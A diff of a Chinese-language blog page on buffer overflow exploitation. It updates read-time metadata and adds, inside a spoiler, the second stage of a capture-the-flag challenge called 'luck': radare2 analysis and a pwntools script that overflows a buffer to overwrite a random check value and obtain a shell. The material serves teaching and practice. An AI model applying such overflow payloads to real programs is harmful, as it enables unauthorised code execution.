@@ -386,14 +386,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    2.1k
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    8 Min
+                    9 Min
                 </div>
                 
 
@@ -653,7 +653,12 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 <li>先隨意輸入來確定 buffer 位置</li>
 <li>計算 buffer 位置和⽬標位置距離多遠<br><img src="https://i.imgur.com/EbmFcCW.png"><br>0x7fffffffe7a8：buffer 位置<br>0x7fffffffe798：目標位置<br><code>offset = 0x7fffffffe7a8 - 0x7fffffffe798 = 0x10</code></li>
 </ul>
-<h4 id="題目-luck"><a href="#題目-luck" class="headerlink" title="[題目] luck"></a>[題目] luck</h4><p>先去執行看看，它會讓我們輸入東西<br><img src="https://i.imgur.com/x9wSaUD.png"></p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        [題目] luck
+    </div>
+    <div class="spoiler-content">
+        <p>先去執行看看，它會讓我們輸入東西<br><img src="https://i.imgur.com/x9wSaUD.png"></p>
 <p>我們可以先用 r2 去分析第一階段要做什麼<br><img src="https://i.imgur.com/rf8z3sR.png"></p>
 <pre class=" language-bash"><code class="language-bash">$ r2 ./luck <span class="token comment" spellcheck="true">#進入 r2</span>
 <span class="token operator">></span> aa <span class="token comment" spellcheck="true">#分析</span>
@@ -698,6 +703,27 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p><img src="https://i.imgur.com/mT0WFW7.png"><br>執行後可以看到我們通過了第一階段</p>
+<ul>
+<li>第二階段<br><img src="https://i.imgur.com/EsHygvz.png"></li>
+</ul>
+<p><code>scanf()</code>有二個參數，第一個參數是 format，我們去看一下<br><code>s 0x400a93</code><br>然後跳到 Hex mode<br><img src="https://i.imgur.com/sEh9bKc.png"><br>在<code>0x40093</code>可以看到它吃的是<code>%d</code>(代表整數)<br>讀一個整數進來後會存到 <code>var_1ch</code><br>剛才有題到 random 會存在 <code>var_ch</code></p>
+<p><img src="https://i.imgur.com/BErwebM.png"><br>從這裡可以看到 <code>var_1ch</code> 要等於 <code>var_ch</code><br>雖然我們不知道<code>var_ch</code>是什麼，但我們可以把它覆蓋掉阿~<br>可以把它改成<code>1</code></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./luck'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第一行</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第二行</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfaceb00c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>接著我們輸入<code>1</code>後就可以拿到 shell 了！<br><img src="https://i.imgur.com/CxOpd3n.png"></p>
+
+    </div>
+</div>
+
 <h3 id="ret2code"><a href="#ret2code" class="headerlink" title="ret2code"></a>ret2code</h3><p>透過 Buffer Overflow 改變 return address<br>將 return address 改到 code 中任意處</p>
 <blockquote>
 <p>須關閉 PIE</p>
